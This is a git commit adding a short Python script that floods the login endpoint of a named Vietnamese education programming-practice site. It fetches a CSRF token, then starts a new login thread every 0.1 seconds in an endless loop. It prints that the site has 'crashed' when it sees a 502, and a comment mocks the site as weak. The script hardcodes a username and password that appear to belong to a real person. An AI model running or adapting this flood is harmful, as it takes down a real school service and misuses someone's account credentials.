09cf7db49de297901f1cb4608452a7d31b17d19d
HecatiA <88549714+LiterallyATrueClown@users.noreply.github.com>
2024-01-01 10:31:20 +0700

    Hi hi

---
+++ Luyện Lập Trình/Đăng nhập.py
@@ -0,0 +1,24 @@
+import requests
+import time
+import threading
+
+url = "http://llt.thanhhoa.edu.vn:8089/accounts/login"
+csrftoken = requests.get(url).cookies.get_dict()['csrftoken']
+
+def dang_nhap():
+    try:
+        body = {
+            'csrfmiddlewaretoken': csrftoken,
+            'username': "nguyendtk",
+            'password': 'Khoi@280409',
+        }
+        response = requests.post(url, data=body)
+        print(response.status_code)
+        if response.status_code == 502:
+            print("Web đã sập")
+    except:
+        pass
+
+while True:
+    threading.Thread(target=dang_nhap).start()
+    time.sleep(0.1) # Cái web yếu xìu này thì không cần phải tốn công mất sức làm gì
